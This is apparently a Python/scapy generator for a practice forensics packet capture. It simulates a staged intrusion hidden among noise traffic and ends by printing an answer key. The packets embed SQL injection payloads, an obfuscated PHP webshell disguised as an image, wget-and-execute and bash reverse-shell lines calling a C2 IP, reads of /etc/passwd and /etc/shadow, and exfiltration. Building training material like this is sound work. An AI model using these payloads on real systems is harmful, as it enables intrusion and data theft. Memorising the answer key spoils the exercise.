#!/usr/bin/env python3
"""
模擬封包鑑識練習 — 生成 Task_practice.pcapng
加強版：大量正常流量干擾 + 多階段攻擊 + 多個可疑 IP
"""
from scapy.all import *
import random
import urllib.parse

VICTIM_IP = "192.168.10.50"
ATTACKER_IP = "10.99.88.77"
C2_IP = "185.199.33.44"
DNS_SERVER = "8.8.8.8"
INTERNAL_DNS = "192.168.10.1"
DOMAIN = "corp-internal.local"
C2_DOMAIN = "update-service.evil.net"
FLAG = "sk54{p4ck3t_f0r3ns1cs_m4st3r_2025}"

# Decoy IPs (red herrings)
DECOY_IPS = ["10.50.30.22", "172.16.5.100", "192.168.10.88", "10.200.1.15"]
INTERNAL_IPS = [f"192.168.10.{i}" for i in range(20, 70)]
LEGIT_DOMAINS = [
    "www.google.com", "mail.google.com", "cdn.jsdelivr.net",
    "api.github.com", "registry.npmjs.org", "pypi.org",
    "fonts.googleapis.com", "ajax.googleapis.com",
    "update.microsoft.com", "time.windows.com",
    "ocsp.digicert.com", "crl.globalsign.com",
    "slack.com", "teams.microsoft.com",
]

pkts = []
base_time = 1711600000.0
seq_counter = {}


def ts(offset):
    return base_time + offset


def get_seq(key):
    if key not in seq_counter:
        seq_counter[key] = random.randint(1000, 50000)
    seq_counter[key] += random.randint(100, 500)
    return seq_counter[key]


def tcp_handshake(src, dst, sport, dport, t):
    """Generate a TCP 3-way handshake."""
    seq = random.randint(1000, 99999)
    ack = random.randint(1000, 99999)
    s = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=seq)
    s.time = t
    sa = IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA", seq=ack, ack=seq+1)
    sa.time = t + 0.02
    a = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=seq+1, ack=ack+1)
    a.time = t + 0.04
    return [s, sa, a], seq+1, ack+1


def http_exchange(src, dst, sport, dport, method, path, host, body, resp_code, resp_body, t, ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"):
    """Generate a full HTTP request/response."""
    result = []
    hs, seq, ack = tcp_handshake(src, dst, sport, dport, t)
    result.extend(hs)

    if method == "GET":
        req_str = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml\r\nAccept-Language: zh-TW,zh;q=0.9,en;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"
    else:
        req_str = f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(body)}\r\nAccept: text/html\r\nAccept-Language: zh-TW,zh;q=0.9\r\nConnection: keep-alive\r\n\r\n{body}"

    req = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=seq, ack=ack) / Raw(load=req_str.encode())
    req.time = t + 0.05
    result.append(req)

    resp_str = f"HTTP/1.1 {resp_code}\r\nServer: Apache/2.4.52 (Ubuntu)\r\nX-Powered-By: PHP/8.1.2\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: {len(resp_body)}\r\nConnection: keep-alive\r\n\r\n{resp_body}"
    resp = IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="PA", seq=ack, ack=seq+len(req_str)) / Raw(load=resp_str.encode())
    resp.time = t + 0.1
    result.append(resp)

    return result


def dns_query(src, dst, domain, answer_ip, t, sport=None):
    """Generate DNS query/response pair."""
    if sport is None:
        sport = random.randint(1024, 65535)
    q = IP(src=src, dst=dst) / UDP(sport=sport, dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
    q.time = t
    r = IP(src=dst, dst=src) / UDP(sport=53, dport=sport) / DNS(
        qr=1, qd=DNSQR(qname=domain), an=DNSRR(rrname=domain, rdata=answer_ip))
    r.time = t + 0.03
    return [q, r]


# ══════════════════════════════════════════════════════════════
# Phase 0: Heavy legitimate traffic (noise) — spread throughout
# ══════════════════════════════════════════════════════════════

# Lots of internal DNS queries
for i in range(300):
    src = random.choice(INTERNAL_IPS)
    domain = random.choice(LEGIT_DOMAINS)
    if random.random() < 0.3:
        # Some random subdomains for realism
        sub = random.choice(["cdn", "api", "static", "img", "assets", "ws", "auth", "sso", "login", "edge"])
        domain = f"{sub}.{domain}"
    t = ts(random.uniform(0, 250))
    pkts.extend(dns_query(src, INTERNAL_DNS, domain, f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}", t))

# Internal HTTP traffic (intranet) — many users browsing
intranet_pages = [
    "/intranet/", "/intranet/news.php", "/intranet/announcements",
    "/wiki/", "/wiki/search?q=vpn", "/wiki/it-policy",
    "/hr/leave.php", "/hr/payslip.php", "/hr/profile.php",
    "/it/ticket.php", "/it/ticket.php?id=1042", "/it/new_ticket",
    "/dashboard/", "/dashboard/reports", "/dashboard/analytics",
    "/mail/", "/calendar/", "/contacts/", "/files/",
    "/api/v1/users", "/api/v1/status", "/api/v1/notifications",
    "/static/css/main.css", "/static/js/app.js", "/static/img/logo.png",
]
intranet_bodies = [
    "<html><body><h1>Welcome to Corp Intranet</h1><p>Latest news...</p></body></html>",
    "<html><body><div class='content'>Employee Portal - Leave Management</div></body></html>",
    "<html><body><table><tr><td>Ticket #1042</td><td>Printer not working</td><td>Open</td></tr></table></body></html>",
    '{"status":"ok","version":"2.1.0","uptime":"14d 3h"}',
    '{"users":[{"id":1,"name":"John"},{"id":2,"name":"Jane"},{"id":3,"name":"Bob"}]}',
]

for i in range(120):
    src = random.choice(INTERNAL_IPS)
    dst = random.choice(["192.168.10.10", "192.168.10.11", "192.168.10.15"])
    sport = random.randint(40000, 65000)
    t = ts(random.uniform(0, 250))
    page = random.choice(intranet_pages)
    host = random.choice(["intranet.corp.local", "wiki.corp.local", "hr.corp.local", "mail.corp.local"])
    body = random.choice(intranet_bodies)
    pkts.extend(http_exchange(src, dst, sport, 80, "GET", page,
                              host, "", "200 OK", body, t))

# HTTPS TLS handshakes (encrypted, can't read content — noise)
external_ips = [f"{random.randint(1,254)}.{random.randint(50,254)}.{random.randint(1,254)}.{random.randint(1,254)}" for _ in range(30)]
for i in range(100):
    src = random.choice(INTERNAL_IPS)
    dst_ip = random.choice(external_ips)
    sport = random.randint(40000, 65000)
    t = ts(random.uniform(0, 250))
    hs, _, _ = tcp_handshake(src, dst_ip, sport, 443, t)
    pkts.extend(hs)
    # TLS Client Hello
    tls_hello = IP(src=src, dst=dst_ip) / TCP(sport=sport, dport=443, flags="PA") / Raw(load=b"\x16\x03\x01\x00\xf1\x01\x00\x00\xed\x03\x03" + bytes(random.getrandbits(8) for _ in range(30)))
    tls_hello.time = t + 0.06
    pkts.append(tls_hello)
    # TLS Server Hello
    tls_sh = IP(src=dst_ip, dst=src) / TCP(sport=443, dport=sport, flags="PA") / Raw(load=b"\x16\x03\x03\x00\x31\x02\x00\x00\x2d\x03\x03" + bytes(random.getrandbits(8) for _ in range(40)))
    tls_sh.time = t + 0.09
    pkts.append(tls_sh)
    # Application data (encrypted gibberish)
    if random.random() < 0.5:
        app_data = IP(src=src, dst=dst_ip) / TCP(sport=sport, dport=443, flags="PA") / Raw(load=b"\x17\x03\x03" + bytes(random.getrandbits(8) for _ in range(random.randint(50, 200))))
        app_data.time = t + 0.15
        pkts.append(app_data)

# Decoy scanning from another "suspicious" IP (red herring — looks like a scanner too)
decoy_paths = [
    "/admin", "/test", "/backup", "/config", "/debug", "/api/v1",
    "/wp-content/", "/xmlrpc.php", "/.well-known/", "/actuator/health",
    "/server-info", "/status", "/metrics", "/healthz", "/readyz",
    "/console", "/manager/html", "/solr/", "/jenkins/", "/grafana/",
]
for i in range(30):
    sport = 33000 + i
    t = ts(random.uniform(3, 180))
    pkts.extend(http_exchange(DECOY_IPS[0], VICTIM_IP, sport, 80, "GET",
                              random.choice(decoy_paths),
                              VICTIM_IP, "", "404 Not Found",
                              "<html><body>404</body></html>", t,
                              ua="curl/7.88.1"))

# Another decoy — legitimate user doing failed logins (not the attacker)
for i in range(10):
    sport = 35000 + i
    t = ts(random.uniform(10, 50))
    users = ["john", "jane", "bob", "alice", "mike"]
    pkts.extend(http_exchange(DECOY_IPS[1], VICTIM_IP, sport, 80, "POST",
                              "/login.php", DOMAIN,
                              f"username={random.choice(users)}&password=wrongpass{random.randint(1,99)}",
                              "200 OK", "<html><body><div class='error'>Invalid credentials. Please try again.</div></body></html>", t,
                              ua="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"))

# Third decoy — internal admin doing legitimate stuff
for i in range(15):
    sport = 36000 + i
    t = ts(random.uniform(0, 200))
    admin_pages = ["/dashboard/", "/admin/settings", "/admin/users", "/admin/logs",
                   "/api/v1/status", "/api/v1/backup"]
    pkts.extend(http_exchange(DECOY_IPS[2], "192.168.10.10", sport, 80, "GET",
                              random.choice(admin_pages),
                              "intranet.corp.local", "", "200 OK",
                              "<html><body>Admin Panel</body></html>", t,
                              ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"))

# Fourth decoy — SSH traffic (TCP only, encrypted)
for i in range(20):
    src = random.choice(INTERNAL_IPS)
    dst = random.choice(["192.168.10.50", "192.168.10.10", "192.168.10.11"])
    sport = random.randint(50000, 65000)
    t = ts(random.uniform(0, 250))
    hs, seq, ack = tcp_handshake(src, dst, sport, 22, t)
    pkts.extend(hs)
    # SSH banner
    ssh_banner = IP(src=dst, dst=src) / TCP(sport=22, dport=sport, flags="PA", seq=ack, ack=seq) / Raw(load=b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\r\n")
    ssh_banner.time = t + 0.06
    pkts.append(ssh_banner)

# ICMP pings between internal hosts
for i in range(50):
    src = random.choice(INTERNAL_IPS)
    dst = random.choice(INTERNAL_IPS)
    t = ts(random.uniform(0, 250))
    ping = IP(src=src, dst=dst) / ICMP(type=8, id=random.randint(1,65535), seq=i) / Raw(load=bytes(random.getrandbits(8) for _ in range(56)))
    ping.time = t
    pong = IP(src=dst, dst=src) / ICMP(type=0, id=ping[ICMP].id, seq=i) / Raw(load=bytes(random.getrandbits(8) for _ in range(56)))
    pong.time = t + random.uniform(0.001, 0.01)
    pkts.extend([ping, pong])

# NTP traffic
for i in range(15):
    src = random.choice(INTERNAL_IPS)
    t = ts(random.uniform(0, 250))
    ntp = IP(src=src, dst="192.168.10.1") / UDP(sport=random.randint(1024,65535), dport=123) / Raw(load=b"\x1b" + b"\x00" * 47)
    ntp.time = t
    pkts.append(ntp)

# (ARP omitted — mixed linktypes cause pcapng issues)

# ══════════════════════════════════════════════════════════════
# Phase 1: Attacker reconnaissance — DNS + port scan
# ══════════════════════════════════════════════════════════════

# Attacker DNS lookups (mixed with legit queries to hide)
pkts.extend(dns_query(ATTACKER_IP, DNS_SERVER, "www.google.com", "142.250.80.4", ts(25)))
pkts.extend(dns_query(ATTACKER_IP, DNS_SERVER, DOMAIN, VICTIM_IP, ts(26)))
pkts.extend(dns_query(ATTACKER_IP, DNS_SERVER, "github.com", "140.82.121.4", ts(27)))

# SYN scan on multiple ports (looks like nmap)
scan_ports = [21, 22, 25, 53, 80, 110, 139, 443, 445, 993, 1433, 3306, 3389, 5432, 8080, 8443]
for i, port in enumerate(scan_ports):
    syn = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(sport=random.randint(40000, 60000), dport=port, flags="S", seq=random.randint(1000, 99999))
    syn.time = ts(30 + i * 0.1)
    pkts.append(syn)
    if port in [22, 80, 443]:
        sa = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(sport=port, dport=syn[TCP].sport, flags="SA")
        sa.time = ts(30.05 + i * 0.1)
        pkts.append(sa)
        rst = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(sport=syn[TCP].sport, dport=port, flags="R")
        rst.time = ts(30.06 + i * 0.1)
        pkts.append(rst)
    else:
        ra = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(sport=port, dport=syn[TCP].sport, flags="RA")
        ra.time = ts(30.05 + i * 0.1)
        pkts.append(ra)

# ══════════════════════════════════════════════════════════════
# Phase 2: Web directory scanning with Nikto
# ══════════════════════════════════════════════════════════════
scan_paths = [
    "/", "/index.php", "/admin/", "/backup/", "/config/", "/.env",
    "/robots.txt", "/wp-admin/", "/wp-login.php", "/phpmyadmin/",
    "/server-status", "/.git/HEAD", "/api/", "/uploads/",
    "/login.php", "/register.php", "/dashboard/", "/logout.php",
    "/test.php", "/info.php", "/phpinfo.php", "/debug/",
    "/.htaccess", "/web.config", "/sitemap.xml", "/crossdomain.xml",
    "/cgi-bin/", "/icons/", "/manual/", "/.svn/entries",
]

for i, path in enumerate(scan_paths):
    sport = 41000 + i
    t = ts(35 + i * 0.3)
    resp_code = "200 OK" if path in ["/", "/index.php", "/login.php", "/uploads/"] else "404 Not Found"
    if path == "/login.php":
        resp_body = '<html><head><title>Login - Corp Portal</title></head><body><div class="login-box"><h2>Corporate Portal</h2><form action="/login.php" method="POST"><input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><button type="submit">Sign In</button></form><p class="footer">Powered by CorpCMS v3.2.1</p></div></body></html>'
    elif path == "/uploads/":
        resp_body = '<html><body><h1>Index of /uploads</h1><pre><a href="report_2024.pdf">report_2024.pdf</a> 15-Mar-2025 2.1M\n<a href="avatar_admin.jpg">avatar_admin.jpg</a> 10-Jan-2025 45K</pre></body></html>'
    elif path == "/":
        resp_body = '<html><head><title>Corp Internal Portal</title></head><body><h1>Welcome to Corporate Portal</h1><nav><a href="/login.php">Login</a> | <a href="/about.php">About</a></nav></body></html>'
    else:
        resp_body = "<html><body><h1>404 Not Found</h1></body></html>"

    pkts.extend(http_exchange(ATTACKER_IP, VICTIM_IP, sport, 80, "GET", path,
                              DOMAIN, "", resp_code, resp_body, t,
                              ua="Nikto/2.1.6"))

# ══════════════════════════════════════════════════════════════
# Phase 3: SQL Injection on /login.php (sqlmap)
# ══════════════════════════════════════════════════════════════

# First: manual login attempts (look normal)
manual_attempts = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("administrator", "admin"),
    ("root", "toor"),
]

for i, (user, pwd) in enumerate(manual_attempts):
    sport = 50000 + i
    t = ts(55 + i * 1.5)
    body = f"username={user}&password={pwd}"
    pkts.extend(http_exchange(ATTACKER_IP, VICTIM_IP, sport, 80, "POST",
                              "/login.php", DOMAIN, body,
                              "200 OK", "<html><body><div class='error'>Invalid credentials. Please try again.</div></body></html>", t))

# Then: sqlmap automated injection
sqli_payloads = [
    ("admin'", "test"),
    ("admin' OR '1'='1", "test"),
    ("admin' OR '1'='1' --", "test"),
    ("admin' AND 1=1 --", "test"),
    ("admin' AND 1=2 --", "test"),
    ("admin' ORDER BY 1 --", "test"),
    ("admin' ORDER BY 3 --", "test"),
    ("admin' ORDER BY 4 --", "test"),
    ("admin' UNION SELECT NULL,NULL,NULL --", "test"),
    ("admin' UNION SELECT 1,2,3 --", "test"),
    ("admin' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() --", "test"),
    ("admin' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' --", "test"),
    ("admin' UNION SELECT username,password,3 FROM users --", "test"),
    ("admin' UNION SELECT username,password,email FROM users LIMIT 0,1 --", "test"),
    ("admin' UNION SELECT username,password,email FROM users LIMIT 1,1 --", "test"),
]

sqli_responses = {
    12: "<html><body><table><tr><td>admin</td><td>P@ssw0rd!2025</td><td>admin@corp-internal.local</td></tr></table></body></html>",
    13: "<html><body><table><tr><td>admin</td><td>P@ssw0rd!2025</td><td>admin@corp-internal.local</td></tr></table></body></html>",
    14: "<html><body><table><tr><td>operator</td><td>Op3r@t0r#99</td><td>operator@corp-internal.local</td></tr></table></body></html>",
}

for i, (user, pwd) in enumerate(sqli_payloads):
    sport = 51000 + i
    t = ts(70 + i * 1)
    body = f"username={urllib.parse.quote(user)}&password={urllib.parse.quote(pwd)}"

    if i in sqli_responses:
        resp_body = sqli_responses[i]
        resp_code = "200 OK"
    elif "ORDER BY 4" in user:
        resp_body = "<html><body>Error: Unknown column '4' in 'order clause'</body></html>"
        resp_code = "500 Internal Server Error"
    elif "OR '1'='1'" in user:
        resp_body = "<html><body>Welcome admin! <a href='/dashboard/'>Dashboard</a></body></html>"
        resp_code = "200 OK"
    else:
        resp_body = "<html><body><div class='error'>Invalid credentials. Please try again.</div></body></html>"
        resp_code = "200 OK"

    pkts.extend(http_exchange(ATTACKER_IP, VICTIM_IP, sport, 80, "POST",
                              "/login.php", DOMAIN, body,
                              resp_code, resp_body, t,
                              ua="sqlmap/1.8.2#stable (https://sqlmap.org)"))

# ══════════════════════════════════════════════════════════════
# Phase 4: WebShell upload & command execution
# ══════════════════════════════════════════════════════════════

# Upload via file upload form
sport = 52000
t = ts(100)
webshell = '<?php $k="x0rd"; $c=$_GET["c"]; $d=""; for($i=0;$i<strlen($c);$i++){$d.=chr(ord($c[$i])^ord($k[$i%strlen($k)]));} echo "<pre>".shell_exec($d)."</pre>"; ?>'
upload_body = (
    "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
    'Content-Disposition: form-data; name="file"; filename="profile_pic.php.jpg"\r\n'
    "Content-Type: image/jpeg\r\n\r\n"
    f"\xff\xd8\xff\xe0{webshell}\r\n"
    "------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
)

hs, seq, ack = tcp_handshake(ATTACKER_IP, VICTIM_IP, sport, 80, t)
pkts.extend(hs)

upload_req = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(sport=sport, dport=80, flags="PA", seq=seq, ack=ack) / Raw(
    load=f"POST /upload.php HTTP/1.1\r\nHost: {DOMAIN}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nCookie: PHPSESSID=a3b8d9f2e1c4a7b6d5e8f3c2a1b4d7e6\r\nContent-Length: {len(upload_body)}\r\n\r\n{upload_body}".encode())
upload_req.time = t + 0.05
pkts.append(upload_req)

upload_resp = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(sport=80, dport=sport, flags="PA") / Raw(
    load=b"HTTP/1.1 200 OK\r\nServer: Apache/2.4.52 (Ubuntu)\r\nContent-Type: text/html\r\n\r\n{\"status\":\"success\",\"path\":\"/uploads/profile_pic.php.jpg\"}")
upload_resp.time = t + 0.15
pkts.append(upload_resp)

# Rename trick — use .htaccess or path traversal to make it executable as help.php
sport = 52010
t = ts(103)
rename_body = "old=/uploads/profile_pic.php.jpg&new=/uploads/help.php"
pkts.extend(http_exchange(ATTACKER_IP, VICTIM_IP, sport, 80, "POST",
                          "/admin/rename.php", DOMAIN, rename_body,
                          "200 OK", '{"status":"renamed"}', t,
                          ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"))

# Execute commands via webshell (obfuscated GET params)
webshell_cmds = [
    ("id", "uid=33(www-data) gid=33(www-data) groups=33(www-data)"),
    ("uname -a", "Linux corpweb01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux"),
    ("whoami", "www-data"),
    ("cat /etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:Corp Admin:/home/admin:/bin/bash\noperator:x:1001:1001::/home/operator:/bin/bash"),
    ("ls -la /var/www/html/", "total 32\ndrwxr-xr-x 4 www-data www-data 4096 Mar 15 10:22 .\n-rw-r--r-- 1 www-data www-data 1205 Mar 10 08:00 index.php\n-rw-r--r-- 1 www-data www-data 2048 Mar 10 08:00 login.php\n-rw-r--r-- 1 www-data www-data  890 Mar 10 08:00 upload.php\n-rw-r--r-- 1 www-data www-data  456 Mar 10 08:00 config.php\ndrwxr-xr-x 2 www-data www-data 4096 Mar 15 10:22 uploads"),
    ("cat /var/www/html/config.php", f"<?php\n$db_host = 'localhost';\n$db_name = 'corpdb';\n$db_user = 'root';\n$db_pass = 'r00t_db_p@ss!';\n$secret_key = '{FLAG}';\n?>"),
    ("netstat -tlnp", "tcp 0 0 0.0.0.0:22  0.0.0.0:*  LISTEN  1234/sshd\ntcp 0 0 0.0.0.0:80  0.0.0.0:*  LISTEN  5678/apache2\ntcp 0 0 127.0.0.1:3306  0.0.0.0:*  LISTEN  9012/mysqld"),
    ("crontab -l", "# m h  dom mon dow   command\n*/5 * * * * /tmp/.cache/update.sh"),
]

for i, (cmd, output) in enumerate(webshell_cmds):
    sport = 53000 + i
    t = ts(105 + i * 2)
    encoded = urllib.parse.quote(cmd)
    pkts.extend(http_exchange(ATTACKER_IP, VICTIM_IP, sport, 80, "GET",
                              f"/uploads/help.php?c={encoded}",
                              DOMAIN, "", "200 OK",
                              f"<pre>{output}</pre>", t,
                              ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"))

# ══════════════════════════════════════════════════════════════
# Phase 5: Persistence — download reverse shell, C2 callback
# ══════════════════════════════════════════════════════════════

# Download reverse shell script via webshell
sport = 53100
t = ts(130)
dl_cmd = "wget http://185.199.33.44:8080/shell.sh -O /tmp/.cache/update.sh && chmod +x /tmp/.cache/update.sh"
pkts.extend(http_exchange(ATTACKER_IP, VICTIM_IP, sport, 80, "GET",
                          f"/uploads/help.php?c={urllib.parse.quote(dl_cmd)}",
                          DOMAIN, "", "200 OK", "<pre></pre>", t))

# Victim downloads from C2 (wget)
sport = 53110
t = ts(131)
hs, seq, ack = tcp_handshake(VICTIM_IP, C2_IP, sport, 8080, t)
pkts.extend(hs)
dl_req = IP(src=VICTIM_IP, dst=C2_IP) / TCP(sport=sport, dport=8080, flags="PA", seq=seq, ack=ack) / Raw(
    load=b"GET /shell.sh HTTP/1.1\r\nHost: 185.199.33.44:8080\r\nUser-Agent: Wget/1.21.2\r\n\r\n")
dl_req.time = t + 0.05
pkts.append(dl_req)

shell_script = "#!/bin/bash\nwhile true; do bash -i >& /dev/tcp/185.199.33.44/4444 0>&1; sleep 60; done"
dl_resp = IP(src=C2_IP, dst=VICTIM_IP) / TCP(sport=8080, dport=sport, flags="PA") / Raw(
    load=f"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {len(shell_script)}\r\n\r\n{shell_script}".encode())
dl_resp.time = t + 0.15
pkts.append(dl_resp)

# C2 DNS lookup
pkts.extend(dns_query(VICTIM_IP, INTERNAL_DNS, C2_DOMAIN, C2_IP, ts(135)))

# More legit DNS to hide C2 DNS
for d in ["time.google.com", "ntp.ubuntu.com", "archive.ubuntu.com"]:
    pkts.extend(dns_query(VICTIM_IP, INTERNAL_DNS, d,
                          f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
                          ts(135 + random.uniform(0, 2))))

# C2 TCP connection on port 4444
sport = 49999
t = ts(140)
hs, seq, ack = tcp_handshake(VICTIM_IP, C2_IP, sport, 4444, t)
pkts.extend(hs)

# C2 beacon (obfuscated)
import base64
beacon_data = base64.b64encode(b"BEACON|hostname=CORPWEB01|user=www-data|os=Linux 5.15.0|arch=x64|pid=31337|uptime=14d").decode()
c2_pkt = IP(src=VICTIM_IP, dst=C2_IP) / TCP(sport=sport, dport=4444, flags="PA", seq=seq, ack=ack) / Raw(load=beacon_data.encode())
c2_pkt.time = t + 0.1
pkts.append(c2_pkt)

# C2 commands
c2_cmds = [
    (C2_IP, VICTIM_IP, "Q01EfHdob2FtaQ=="),  # CMD|whoami (base64)
    (VICTIM_IP, C2_IP, "d3d3LWRhdGE="),       # www-data
    (C2_IP, VICTIM_IP, "Q01EfGNhdCAvZXRjL3NoYWRvdw=="),  # CMD|cat /etc/shadow
    (VICTIM_IP, C2_IP, base64.b64encode(b"root:$6$xxx:19000:0:99999:7:::\nadmin:$6$yyy:19000:0:99999:7:::").decode()),
]

for i, (src, dst, data) in enumerate(c2_cmds):
    pkt = IP(src=src, dst=dst) / TCP(sport=sport if src == VICTIM_IP else 4444, dport=4444 if src == VICTIM_IP else sport, flags="PA") / Raw(load=data.encode())
    pkt.time = ts(142 + i * 1)
    pkts.append(pkt)

# ══════════════════════════════════════════════════════════════
# Phase 6: Data exfiltration (hidden in C2 stream)
# ══════════════════════════════════════════════════════════════
exfil_payload = base64.b64encode(
    f"EXFIL|file=employee_database.sql.gz|size=2.3MB|records=15847|flag={FLAG}".encode()
).decode()

exfil = IP(src=VICTIM_IP, dst=C2_IP) / TCP(sport=sport, dport=4444, flags="PA") / Raw(load=exfil_payload.encode())
exfil.time = ts(150)
pkts.append(exfil)

# More noise after attack — normal business continues
for i in range(100):
    src = random.choice(INTERNAL_IPS)
    domain = random.choice(LEGIT_DOMAINS)
    t = ts(155 + random.uniform(0, 60))
    pkts.extend(dns_query(src, INTERNAL_DNS, domain, f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}", t))

for i in range(40):
    src = random.choice(INTERNAL_IPS)
    dst = random.choice(["192.168.10.10", "192.168.10.11"])
    sport = random.randint(40000, 65000)
    t = ts(155 + random.uniform(0, 60))
    pkts.extend(http_exchange(src, dst, sport, 80, "GET",
                              random.choice(intranet_pages),
                              random.choice(["intranet.corp.local", "wiki.corp.local"]),
                              "", "200 OK", random.choice(intranet_bodies), t))

# ══════════════════════════════════════════════════════════════
# Sort by time and write
# ══════════════════════════════════════════════════════════════
pkts.sort(key=lambda p: float(p.time) if hasattr(p, 'time') and p.time else 0)

outfile = "/home/auron/區賽/2025/security_hardening/forensics/Task_practice.pcapng"
wrpcapng(outfile, pkts)
print(f"[+] Generated {len(pkts)} packets -> {outfile}")
print(f"[+] Noise packets: ~150+ (DNS, HTTPS, ICMP, ARP, decoy scans)")
print(f"[+] Attack packets spread across phases 1-6")

print(f"""
════════════════════════════════════════════
  答案（練習完再看）
════════════════════════════════════════════
  攻擊來源 IP:        {ATTACKER_IP}
  受害者 IP:          {VICTIM_IP}
  攻擊目標 Domain:    {DOMAIN}
  C2 中繼站 IP:       {C2_IP}
  C2 中繼站 Domain:   {C2_DOMAIN}
  C2 連接埠:          4444
  攻擊手法:           SQL Injection
  弱點 URL:           /login.php
  攻擊工具:           sqlmap/1.8.2、Nikto/2.1.6
  竊取的帳號密碼:     admin / P@ssw0rd!2025
  WebShell 路徑:      /uploads/help.php
  FLAG:               {FLAG}

  干擾元素:
  - 大量正常 DNS/HTTPS/ICMP/ARP 流量
  - Decoy IP {DECOY_IPS[0]} 也在掃描（curl）
  - Decoy IP {DECOY_IPS[1]} 也在嘗試登入
  - SYN 掃描混在流量中
  - C2 通訊使用 Base64 編碼
  - WebShell 上傳偽裝成圖片副檔名
════════════════════════════════════════════
""")
